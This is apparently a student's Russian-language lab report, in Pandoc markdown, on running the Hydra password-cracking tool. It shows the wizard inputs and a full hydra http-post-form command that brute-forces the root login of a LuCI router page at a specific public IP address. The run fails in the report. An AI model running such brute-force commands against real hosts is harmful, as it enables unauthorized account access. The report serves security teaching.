---
## Front matter
title: "отчёт по проекту №4"
subtitle: "работа с Hydra"
author: "Кхари Жекка Кализая Арсе"

## Generic otions
lang: ru-RU
toc-title: "Содержание"

## Bibliography
bibliography: bib/cite.bib
csl: pandoc/csl/gost-r-7-0-5-2008-numeric.csl

## Pdf output format
toc: true # Table of contents
toc-depth: 2
lof: true # List of figures
lot: true # List of tables
fontsize: 12pt
linestretch: 1.5
papersize: a4
documentclass: scrreprt
## I18n polyglossia
polyglossia-lang:
  name: russian
  options:
	- spelling=modern
	- babelshorthands=true
polyglossia-otherlangs:
  name: english
## I18n babel
babel-lang: russian
babel-otherlangs: english
## Fonts
mainfont: IBM Plex Serif
romanfont: IBM Plex Serif
sansfont: IBM Plex Sans
monofont: IBM Plex Mono
mathfont: STIX Two Math
mainfontoptions: Ligatures=Common,Ligatures=TeX,Scale=0.94
romanfontoptions: Ligatures=Common,Ligatures=TeX,Scale=0.94
sansfontoptions: Ligatures=Common,Ligatures=TeX,Scale=MatchLowercase,Scale=0.94
monofontoptions: Scale=MatchLowercase,Scale=0.94,FakeStretch=0.9
mathfontoptions:
## Biblatex
biblatex: true
biblio-style: "gost-numeric"
biblatexoptions:
  - parentracker=true
  - backend=biber
  - hyperref=auto
  - language=auto
  - autolang=other*
  - citestyle=gost-numeric
## Pandoc-crossref LaTeX customization
figureTitle: "Рис."
tableTitle: "Таблица"
listingTitle: "Листинг"
lofTitle: "Список иллюстраций"
lotTitle: "Список таблиц"
lolTitle: "Листинги"
## Misc options
indent: true
header-includes:
  - \usepackage{indentfirst}
  - \usepackage{float} # keep figures where there are in the text
  - \floatplacement{figure}{H} # keep figures where there are in the text
---




# Цель работы

Работать с приложением Hydra

# Задание

выполнить команду в приложении Hydra



# Выполнение лабораторной работы


Сначала я искал приложение Hydra (рис. [-@fig:001	]).

![поиск приложения Hydra](image/01.png){#fig:001 		width=70%}

Потом я выполнил его и оно открыл терминал и я смог ввести параметры. Сначала я ввел url  (рис. [-@fig:002	]).

		http://178.72.90.181/cgi-bin/luci 

![url для атаки](image/02.png){#fig:002 		width=70%}

Потом я ввел цель для атаки  (рис. [-@fig:003	]).

		~/pass_lists/dedik_passes.txt

![цель для атаки](image/03.png){#fig:003 		width=70%}


Дальше я ввел username  (рис. [-@fig:004	]).
		
		root

![имя пользователя](image/04.png){#fig:004 		width=70%}

Затем я ввел пароль рис. ([-@fig:005	]) и потом чтобы провать пароли я потом ввел параметр sr (.рис. [-@fig:006	])
		
		test_password
		sr

![пароль](image/05.png){#fig:005 		width=70%}

![пароль](image/06.png){#fig:006 		width=70%}


Потом программа спросил за модул но я оставил его пустым (рис. [-@fig:007	]).

![модул](image/07.png){#fig:007 		width=70%}

далье программа спросил за опции модула но я еще раз оставил его пустым  (рис. [-@fig:008	]).

![параметры модула](image/08.png){#fig:008 		width=70%}


Потом программа показал команду и я нажал Y чтобы подвердить выполнение но появилась ошибка потому что сервис сервера не работает (рис. [-@fig:009	]).

![выполнение команды](image/09.png){#fig:009 		width=70%}

Потом я вывпонил команду, которую написали в интрукции но у меня нет файла dedik_passes.txt (рис. [-@fig:010	]).

		hydra -l root -P ~/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 178.72.90.181 http-post-form "/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username"

![команда](image/10.png){#fig:010 		width=70%}




# Выводы

в эту часть проекта я смог знакомиться с приложением Hydra и его работа 

# Список литературы{.unnumbered}

::: {#refs}
:::
